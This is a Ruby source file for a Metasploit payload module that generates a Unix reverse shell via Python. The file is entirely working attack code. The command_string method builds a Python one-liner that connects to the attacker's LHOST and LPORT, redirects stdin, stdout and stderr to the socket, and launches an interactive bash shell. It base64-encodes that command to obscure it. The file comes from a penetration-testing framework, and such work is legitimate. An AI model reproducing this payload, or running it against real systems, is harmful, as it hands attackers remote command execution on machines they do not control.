##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Unix Command Shell, Reverse TCP (via Python)',
      'Version'     => '$Revision: 0 $',
      'Description' => 'Connect back and create a command shell via Python',
      'Author'      => 'Alex Harvey <alex@pixelfactor.ca>',
      'License'     => MSF_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'python',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
    register_options([
      OptString.new('SHELL', [true, 'The system shell to use.', '/bin/bash'])
    ], self.class)
  end

  def generate
    return super + command_string
  end

  #
  # Generate command string
  #

  def command_string
	sname =(97+rand(23)).chr
	dname = (sname.ord + 1).chr
	hname = (sname.ord + 2).chr
	raw_cmd = "import socket,os;#{sname}=socket.socket();#{sname}.connect((\"#{datastore['LHOST']}\",#{datastore['LPORT']}));#{hname}=#{sname}.fileno();#{dname}=os.dup2;#{dname}(#{hname},0);#{dname}(#{hname},1);#{dname}(#{hname},2);os.execl(\"#{datastore['SHELL']}\",\"-i\")"
	encoded_cmd = Rex::Text.encode_base64(raw_cmd)
    "python -c'exec(\"#{encoded_cmd}\".decode(\"base64\"))'"
  end

end
